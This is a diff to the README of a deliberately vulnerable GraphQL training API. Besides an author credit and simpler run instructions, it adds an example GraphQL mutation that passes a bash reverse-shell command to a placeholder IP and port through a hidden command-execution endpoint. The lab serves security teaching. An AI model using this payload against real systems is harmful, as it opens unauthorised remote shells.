@@ -2,6 +2,8 @@
 
 A simple GraphQL API demonstrating several common vulnerabilities.
 
+Authored by Aidan Noll, Carve Systems, LLC.
+
 ## Requirements
 
 Node, NPM, and Python (for "SSRF")
@@ -23,13 +25,7 @@ npm run sequelize db:seed:all
 To run the main API:
 
 ```
-node build/app.js
-```
-
-Then, from the `static` directory, start the Python server that represents a REST API backend:
-
-```
-python3 -m http.server --bind 127.0.0.1 8081
+./run.sh
 ```
 
 ## Usage
@@ -111,6 +107,17 @@ Introspection reveals all. If introspection is enabled, any hidden/private queri
 GraphIQL automatically does this, so hidden queries show up in it.
 
 This API has a hidden mutation that exposes command execution.
+
+Update with valid ID and port for fun.
+
+```
+mutation {
+  superSecretPrivateMutation(command: "/bin/bash -i >& /dev/tcp/<IPADDRESS>/65000 0>&1") {
+    stdout
+    stderr
+  }
+}
+```
 
 ### SSRF to Backend APIs
 
